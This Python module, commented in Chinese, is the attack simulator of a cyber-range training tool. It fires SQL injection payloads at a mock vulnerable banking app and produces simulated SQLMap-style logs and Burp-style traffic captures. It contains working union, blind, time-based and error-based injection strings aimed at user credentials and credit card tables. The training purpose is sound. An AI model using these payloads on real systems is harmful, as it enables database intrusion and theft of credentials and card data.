"""
攻防演练靶场模块 - 攻击模拟器

模拟SQL注入攻击过程：
- 支持Union注入、盲注、错误注入的攻击模拟
- 生成类SQLMap的攻击输出日志
- 攻击效果实时反馈
- 攻击流量抓包模拟（Burp Suite风格）
"""
import json
import re
import time
from typing import Optional, Dict, Any, List
from datetime import datetime

from modules.shooting_range.vulnerable_app import VulnerableAppSimulator, MOCK_DB


class AttackSimulator:
    """
    攻击模拟器

    模拟SQL注入攻击过程，包括：
    - 攻击向量生成
    - 攻击执行与结果模拟
    - 攻击日志输出（类SQLMap风格）
    - 流量抓包日志（类Burp Suite风格）
    """

    # 预设攻击向量
    ATTACK_PAYLOADS = {
        "union_inject": [
            {"payload": "1 UNION SELECT 1,2,3,4", "description": "基础Union注入测试"},
            {"payload": "1 UNION SELECT id, username, password_hash, email FROM users", "description": "Union注入泄露用户凭证"},
            {"payload": "1 UNION SELECT id, card_no, balance, cvv FROM credit_cards", "description": "Union注入泄露信用卡数据"},
            {"payload": "1 UNION SELECT 1, group_concat(table_name), 3, 4 FROM information_schema.tables", "description": "Union注入枚举数据库表"},
        ],
        "blind_inject": [
            {"payload": "1' OR '1'='1", "description": "恒真条件注入"},
            {"payload": "1' OR '1'='2", "description": "恒假条件注入"},
            {"payload": "1' AND SLEEP(3)--", "description": "基于时间的盲注"},
            {"payload": "1' AND (SELECT COUNT(*) FROM users)>0--", "description": "布尔盲注"},
        ],
        "error_inject": [
            {"payload": "1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT email FROM users LIMIT 1)))", "description": "基于错误的注入"},
            {"payload": "1 AND UPDATEXML(1, CONCAT(0x7e, (SELECT password_hash FROM users LIMIT 1)), 1)", "description": "UpdateXML错误注入"},
        ],
    }

    def __init__(self, vuln_app: VulnerableAppSimulator):
        self._vuln_app = vuln_app
        self._attack_log: List[Dict[str, Any]] = []

    # ──────────────────────────────────────────
    # 攻击执行
    # ──────────────────────────────────────────

    def run_attack(self, target_path: str, payload: str, attack_type: str = "auto") -> Dict[str, Any]:
        """
        执行单次攻击模拟

        Args:
            target_path: 目标API路径
            payload: 攻击载荷
            attack_type: 攻击类型

        Returns:
            攻击结果
        """
        ep = self._vuln_app.get_endpoint(target_path)
        if not ep:
            return {"error": f"目标端点不存在: {target_path}", "success": False}

        # 模拟攻击延迟
        time.sleep(0.5)

        # 模拟攻击
        params = {"id": payload, "keyword": payload, "order_id": payload}
        response = self._vuln_app.handle_request(target_path, ep.method, params)

        attack_result = {
            "timestamp": datetime.now().isoformat(),
            "target": target_path,
            "method": ep.method,
            "payload": payload,
            "attack_type": attack_type,
            "response": response,
            "success": response.get("vuln_detected", False),
            "vulnerable": not ep.fixed,
        }

        self._attack_log.append(attack_result)

        return attack_result

    def run_full_scan(self, target_path: str = None) -> Dict[str, Any]:
        """
        对目标进行全量攻击扫描（模拟SQLMap）

        Args:
            target_path: 目标路径，None则扫描所有端点

        Returns:
            扫描结果
        """
        endpoints = self._vuln_app.get_endpoints()
        if target_path:
            endpoints = [ep for ep in endpoints if ep["path"] == target_path]
            if not endpoints:
                return {"error": f"目标端点不存在: {target_path}"}

        results = []
        for ep in endpoints:
            # 根据漏洞类型选择攻击向量
            vuln_type = ep["vuln_type"]
            payloads = self.ATTACK_PAYLOADS.get(vuln_type, self.ATTACK_PAYLOADS["union_inject"])

            for p in payloads:
                result = self.run_attack(ep["path"], p["payload"], vuln_type)
                results.append(result)

        summary = {
            "total_attacks": len(results),
            "successful": sum(1 for r in results if r.get("success")),
            "failed": sum(1 for r in results if not r.get("success")),
        }

        return {
            "summary": summary,
            "details": results,
            "sqlmap_style_log": self._generate_sqlmap_log(results),
        }

    # ──────────────────────────────────────────
    # 日志输出（类SQLMap风格）
    # ──────────────────────────────────────────

    def _generate_sqlmap_log(self, results: List[Dict[str, Any]]) -> str:
        """生成类SQLMap风格的攻击日志"""
        now = datetime.now().strftime("%H:%M:%S")
        lines = [
            f"[{now}] [INFO] SQLMap v1.8.0#dev",
            f"[{now}] [INFO] 目标: http://target.corebank.com",
            f"[{now}] [INFO] 开始攻击测试",
            "-" * 60,
        ]

        for i, r in enumerate(results):
            if r.get("success"):
                lines.append(
                    f"[{now}] [SUCCESS] URL: {r['target']} | "
                    f"Payload: {r['payload'][:40]}... | "
                    f"类型: {r.get('attack_type', 'unknown')}"
                )
                if "warning" in r.get("response", {}):
                    lines.append(f"          -> {r['response']['warning']}")
            else:
                lines.append(
                    f"[{now}] [INFO] URL: {r['target']} | "
                    f"Payload: {r['payload'][:40]}... | "
                    f"状态: 未检测到漏洞"
                )

        lines.append("-" * 60)
        success_count = sum(1 for r in results if r.get("success"))
        lines.append(f"[{now}] [INFO] 扫描完成。共发现 {success_count} 个可利用的注入点。")

        return "\n".join(lines)

    # ──────────────────────────────────────────
    # 流量抓包模拟（类Burp Suite风格）
    # ──────────────────────────────────────────

    def capture_traffic(self, target_path: str, payload: str) -> str:
        """
        模拟Burp Suite抓包输出

        Args:
            target_path: 目标路径
            payload: 攻击载荷

        Returns:
            HTTP请求/响应详情
        """
        ep = self._vuln_app.get_endpoint(target_path)

        request = (
            f"GET {target_path}?id={payload} HTTP/1.1\r\n"
            f"Host: api.corebank.com\r\n"
            f"User-Agent: Mozilla/5.0 (compatible; SQLMap/1.8)\r\n"
            f"Accept: */*\r\n"
            f"Accept-Language: zh-CN,zh;q=0.9\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        )

        if ep and ep.fixed:
            response = (
                "HTTP/1.1 200 OK\r\n"
                "Content-Type: application/json\r\n"
                "\r\n"
                '{"data": [{"id": 1, "username": "admin"}]}'
            )
        else:
            response = (
                "HTTP/1.1 200 OK\r\n"
                "Content-Type: application/json\r\n"
                "X-Vulnerable: true\r\n"
                "\r\n"
                '{"data": [{"id": 1, "username": "admin", "card_no": "6228480012345678", "balance": 50000.00}]}'
            )

        return (
            f"=== Burp Suite Professional - HTTP History ===\n"
            f"Request #{len(self._attack_log) + 1}:\n"
            f"{'=' * 60}\n"
            f"【请求】\n"
            f"{request}\n"
            f"【响应】\n"
            f"{response}\n"
            f"{'=' * 60}\n"
            f"⚠ 检测到注入点: {target_path}\n"
            f"   攻击Payload: {payload}\n"
            f"   漏洞类型: Union注入/数据泄露\n"
        )

    # ──────────────────────────────────────────
    # 攻击结果查询
    # ──────────────────────────────────────────

    def get_attack_log(self, limit: int = 20) -> List[Dict[str, Any]]:
        """获取攻击日志"""
        return self._attack_log[-limit:]

    def get_attack_summary(self) -> Dict[str, Any]:
        """获取攻击统计"""
        return {
            "total_attacks": len(self._attack_log),
            "successful_attacks": sum(1 for a in self._attack_log if a.get("success")),
            "vulnerable_endpoints": len(set(a["target"] for a in self._attack_log if a.get("success"))),
            "attack_types": self._count_attack_types(),
        }

    def _count_attack_types(self) -> Dict[str, int]:
        """统计攻击类型"""
        counts = {}
        for a in self._attack_log:
            at = a.get("attack_type", "unknown")
            counts[at] = counts.get(at, 0) + 1
        return counts

    def clear_log(self):
        """清除攻击日志"""
        self._attack_log.clear()